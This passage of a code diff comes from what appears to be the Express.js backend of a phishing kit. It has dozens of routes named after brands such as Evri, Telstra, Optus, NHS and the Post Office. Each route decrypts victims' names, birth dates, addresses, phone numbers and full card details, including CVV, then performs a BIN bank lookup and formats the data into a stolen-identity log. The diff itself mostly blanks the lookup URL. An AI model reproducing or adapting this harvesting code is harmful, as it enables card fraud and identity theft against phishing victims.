 app.post("/mannyman789", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13450,7 +13157,7 @@ app.post("/mannyman789", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13481,7 +13188,6 @@ app.post("/mannyman789", (req, res) => {
 });
 
 let mulligang135 = 0;
-
 
 app.post("/mulligang135", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13526,7 +13232,7 @@ app.post("/mulligang135", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13557,7 +13263,6 @@ app.post("/mulligang135", (req, res) => {
 });
 
 let lingypack = 0;
-
 
 app.post("/lingypackNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13602,7 +13307,7 @@ app.post("/lingypackNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13632,7 +13337,6 @@ app.post("/lingypackNHS", (req, res) => {
     });
 });
 
-
 app.post("/giveip", (req, res) => {
   ip = req.body.ip;
 
@@ -13649,7 +13353,6 @@ app.post("/giveip", (req, res) => {
 //ENERGY
 //ENERGY
 //ENERGY
-
 
 app.post("/energyDP", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -13694,7 +13397,7 @@ app.post("/energyDP", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13750,7 +13453,6 @@ app.post("/energyDP", async (req, res) => {
     });
 });
 
-
 app.post("/energyFpays", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -13794,7 +13496,7 @@ app.post("/energyFpays", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13850,7 +13552,6 @@ app.post("/energyFpays", async (req, res) => {
     });
 });
 
-
 app.post("/energyTriz", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -13894,7 +13595,7 @@ app.post("/energyTriz", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13923,7 +13624,6 @@ app.post("/energyTriz", async (req, res) => {
     });
 });
 
-
 app.post("/energy", async (req, res) => {
   let count;
   let index;
@@ -13943,7 +13643,7 @@ app.post("/energy", async (req, res) => {
     }
     info.bin = formatBin;
   }
-  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
+  let binLookup = await axios.get(``);
   let bank = binLookup.data.bank.name;
   let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
   var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
@@ -13994,7 +13694,6 @@ app.post("/energy", async (req, res) => {
 //POSTOFFICE
 //POSTOFFICE
 
-
 app.post("/tCapz", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -14038,7 +13737,7 @@ app.post("/tCapz", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14071,7 +13770,6 @@ app.post("/tCapz", (req, res) => {
 //TELSTRA
 //TELSTRA
 //TELSTRA
-
 
 app.post("/t1Telstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14122,7 +13820,7 @@ app.post("/t1Telstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14162,7 +13860,6 @@ app.post("/t1Telstra", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/fredTelstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14213,7 +13910,7 @@ app.post("/fredTelstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14253,7 +13950,6 @@ app.post("/fredTelstra", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/osbTelstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14304,7 +14000,7 @@ app.post("/osbTelstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14355,7 +14051,6 @@ app.post("/osbTelstra", (req, res) => {
     });
 });
 
-
 app.post("/g7000telstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
     CryptoJS.enc.Utf8
@@ -14405,7 +14100,7 @@ app.post("/g7000telstra", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14509,7 +14204,7 @@ app.post("/spooferGooferOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14551,7 +14246,6 @@ app.post("/spooferGooferOptus", (req, res) => {
 });
 
 let moneymanmino = 0;
-
 
 app.post("/mmmOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -14605,7 +14299,7 @@ app.post("/mmmOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14645,7 +14339,6 @@ app.post("/mmmOptus", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/g700Optus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -14699,7 +14392,7 @@ app.post("/g700Optus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14739,7 +14432,6 @@ app.post("/g700Optus", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/firstTrustOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -14793,7 +14485,7 @@ app.post("/firstTrustOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14850,7 +14542,6 @@ app.post("/firstTrustOptus", (req, res) => {
     });
 });
 
-
 app.post("/gooferHaytchOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
     CryptoJS.enc.Utf8
@@ -14900,7 +14591,7 @@ app.post("/gooferHaytchOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14926,7 +14617,6 @@ app.post("/gooferHaytchOptus", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/offshorebillionsOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -14980,7 +14670,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15036,7 +14726,6 @@ app.post("/offshorebillionsOptus", (req, res) => {
     });
 });
 
-
 app.post("/loyaltyOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15086,7 +14775,7 @@ app.post("/loyaltyOptus", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15130,7 +14819,6 @@ app.post("/loyaltyOptus", (req, res) => {
 //EVRI
 //EVRI
 //EVRI
-
 
 app.post("/YardzUnitEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -15178,7 +14866,7 @@ app.post("/YardzUnitEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15235,7 +14923,6 @@ app.post("/YardzUnitEvri", (req, res) => {
     });
 });
 
-
 app.post("/stackerEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15282,7 +14969,7 @@ app.post("/stackerEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15339,7 +15026,6 @@ app.post("/stackerEvri", (req, res) => {
     });
 });
 
-
 app.post("/charlieEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15386,7 +15072,7 @@ app.post("/charlieEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15443,7 +15129,6 @@ app.post("/charlieEvri", (req, res) => {
     });
 });
 
-
 app.post("/ghostEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15484,7 +15169,7 @@ app.post("/ghostEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15541,7 +15226,6 @@ app.post("/ghostEvri", (req, res) => {
     });
 });
 
-
 app.post("/gh0stEvri", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15588,7 +15272,7 @@ app.post("/gh0stEvri", async (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15650,7 +15334,6 @@ app.post("/gh0stEvri", async (req, res) => {
     });
 });
 
-
 app.post("/barksdaleEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15691,7 +15374,7 @@ app.post("/barksdaleEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15748,7 +15431,6 @@ app.post("/barksdaleEvri", (req, res) => {
     });
 });
 
-
 app.post("/baliEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15789,7 +15471,7 @@ app.post("/baliEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15848,7 +15530,6 @@ app.post("/baliEvri", (req, res) => {
 
 let dpFullz = 0;
 
-
 app.post("/dpEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15895,7 +15576,7 @@ app.post("/dpEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -15952,7 +15633,6 @@ app.post("/dpEvri", (req, res) => {
     });
 });
 
-
 app.post("/spooferEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -15993,7 +15673,7 @@ app.post("/spooferEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16052,7 +15732,6 @@ app.post("/spooferEvri", (req, res) => {
 
 let truth = 0;
 
-
 app.post("/truthEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16093,7 +15772,7 @@ app.post("/truthEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16150,7 +15829,6 @@ app.post("/truthEvri", (req, res) => {
     });
 });
 
-
 app.post("/goblinzEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16191,7 +15869,7 @@ app.post("/goblinzEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16248,7 +15926,6 @@ app.post("/goblinzEvri", (req, res) => {
     });
 });
 
-
 app.post("/ciscoEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16289,7 +15966,7 @@ app.post("/ciscoEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16348,7 +16025,6 @@ app.post("/ciscoEvri", (req, res) => {
 
 let pweight = 0;
 
-
 app.post("/pweightEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16389,7 +16065,7 @@ app.post("/pweightEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16448,7 +16124,6 @@ app.post("/pweightEvri", (req, res) => {
 
 let ufo = 0;
 
-
 app.post("/ufoEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16489,7 +16164,7 @@ app.post("/ufoEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16548,7 +16223,6 @@ app.post("/ufoEvri", (req, res) => {
 
 let youwantfame = 0;
 
-
 app.post("/ywfEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16589,7 +16263,7 @@ app.post("/ywfEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16648,7 +16322,6 @@ app.post("/ywfEvri", (req, res) => {
 
 let saim = 0;
 
-
 app.post("/saimEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16689,7 +16362,7 @@ app.post("/saimEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16759,7 +16432,6 @@ app.post("/saimEvri", (req, res) => {
     });
 });
 
-
 app.post("/nchroEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16800,7 +16472,7 @@ app.post("/nchroEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16857,7 +16529,6 @@ app.post("/nchroEvri", (req, res) => {
     });
 });
 
-
 app.post("/cbEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -16898,7 +16569,7 @@ app.post("/cbEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -16925,7 +16596,6 @@ app.post("/cbEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/eggmanEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16967,7 +16637,7 @@ app.post("/eggmanEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17006,7 +16676,6 @@ app.post("/eggmanEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/usufEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17048,7 +16717,7 @@ app.post("/usufEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17081,7 +16750,6 @@ app.post("/usufEvri", (req, res) => {
       }
     });
 });
-
 
 app.post("/trizEvri1", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17123,7 +16791,7 @@ app.post("/trizEvri1", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17158,7 +16826,6 @@ app.post("/trizEvri1", (req, res) => {
 });
 
 let kyle = 0;
-
 
 app.post("/kyleEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17200,7 +16867,7 @@ app.post("/kyleEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17272,7 +16939,6 @@ app.post("/kyleEvri", (req, res) => {
 
 let mk = 0;
 
-
 app.post("/mkEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -17319,7 +16985,7 @@ app.post("/mkEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17378,7 +17044,6 @@ app.post("/mkEvri", (req, res) => {
 
 let chasingfunds = 0;
 
-
 app.post("/chasingfundsEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -17425,7 +17090,7 @@ app.post("/chasingfundsEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17460,7 +17125,6 @@ app.post("/chasingfundsEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/@skiii719", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17508,7 +17172,7 @@ app.post("/@skiii719", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17539,7 +17203,6 @@ app.post("/@skiii719", (req, res) => {
 });
 
 let F_zn66 = 0;
-
 
 app.post("/F_zn66", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17587,7 +17250,7 @@ app.post("/F_zn66", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17618,7 +17281,6 @@ app.post("/F_zn66", (req, res) => {
 });
 
 let timesz = 0;
-
 
 app.post("/timeszEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17666,7 +17328,7 @@ app.post("/timeszEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17697,7 +17359,6 @@ app.post("/timeszEvri", (req, res) => {
 });
 
 let TheOnlyMY = 2;
-
 
 app.post("/TheOnlyMYEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17745,7 +17406,7 @@ app.post("/TheOnlyMYEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17774,7 +17435,6 @@ app.post("/TheOnlyMYEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/hoodsEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17816,7 +17476,7 @@ app.post("/hoodsEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17845,7 +17505,6 @@ app.post("/hoodsEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/flashEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17887,7 +17546,7 @@ app.post("/flashEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17918,7 +17577,6 @@ app.post("/flashEvri", (req, res) => {
 });
 
 let aug24 = 0;
-
 
 app.post("/haytchEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17960,7 +17618,7 @@ app.post("/haytchEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -17996,7 +17654,6 @@ app.post("/haytchEvri", (req, res) => {
 });
 
 let daanger = 0;
-
 
 app.post("/dangerrEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18038,7 +17695,7 @@ app.post("/dangerrEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18066,7 +17723,6 @@ app.post("/dangerrEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/cdbEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18114,7 +17770,7 @@ app.post("/cdbEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18143,7 +17799,6 @@ app.post("/cdbEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/masonEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18185,7 +17840,7 @@ app.post("/masonEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18220,7 +17875,6 @@ app.post("/masonEvri", (req, res) => {
 });
 
 let manEvri = 5;
-
 
 app.post("/mannymanEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18262,7 +17916,7 @@ app.post("/mannymanEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18291,7 +17945,6 @@ app.post("/mannymanEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/kelvEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18333,7 +17986,7 @@ app.post("/kelvEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18362,7 +18015,6 @@ app.post("/kelvEvri", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/fpaysEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18404,7 +18056,7 @@ app.post("/fpaysEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18431,7 +18083,6 @@ app.post("/fpaysEvri", (req, res) => {
       }
     });
 });
-
 
 app.post("/fpaysEvri2", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18479,7 +18130,7 @@ app.post("/fpaysEvri2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18506,7 +18157,6 @@ app.post("/fpaysEvri2", (req, res) => {
       }
     });
 });
-
 
 app.post("/fpaysEvri3", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18548,7 +18198,7 @@ app.post("/fpaysEvri3", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18579,7 +18229,6 @@ app.post("/fpaysEvri3", (req, res) => {
       }
     });
 });
-
 
 app.post("/fpaysEvri4", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18621,7 +18270,7 @@ app.post("/fpaysEvri4", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18652,7 +18301,6 @@ app.post("/fpaysEvri4", (req, res) => {
       }
     });
 });
-
 
 app.post("/fpaysEvri5", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18694,7 +18342,7 @@ app.post("/fpaysEvri5", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18725,7 +18373,6 @@ app.post("/fpaysEvri5", (req, res) => {
       }
     });
 });
-
 
 app.post("/mannyman3", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18767,7 +18414,7 @@ app.post("/mannyman3", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18798,7 +18445,6 @@ app.post("/mannyman3", (req, res) => {
 });
 
 let symEvri = 3;
-
 
 app.post("/symEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18840,7 +18486,7 @@ app.post("/symEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -18912,7 +18558,6 @@ app.post("/symEvri", (req, res) => {
 
 let abzOutlaw = 3;
 
-
 app.post("/abzEvri", (req, res) => {
